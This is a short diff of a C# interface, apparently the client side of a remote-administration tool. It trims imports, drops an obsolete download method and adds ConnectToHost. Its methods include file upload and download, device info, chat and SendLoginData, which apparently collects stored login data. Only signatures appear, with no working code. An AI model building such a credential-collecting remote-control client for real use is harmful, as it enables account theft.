@@ -1,9 +1,6 @@
-﻿using System;
-using System.Collections.Generic;
+﻿using System.Collections.Generic;
 using System.Diagnostics;
 using System.Drawing;
-using System.Linq;
-using System.Text;
 
 namespace Interfaces.Users
 {
@@ -13,10 +10,6 @@ namespace Interfaces.Users
         void UploadDirectory(string dirPath, string uploadPath);
         List<string> GetLog();
         IInfoDevice GetInfoDevice();
-        /// <summary>
-        /// Устарело, используйте DownloadF(string FileName, string localPath)
-        /// </summary>
-        void DownloadFloader(string ftpPath, string localPath);
         void DownloadF(string FileName, string localPath);
         void DownloadUpdate();
         void Reconnect();
@@ -37,5 +30,6 @@ namespace Interfaces.Users
         void StopChat();
         void ReadMessage(string message);
         List<LoginData> SendLoginData(string path);
+        void ConnectToHost(string host,int port);
     }
 }
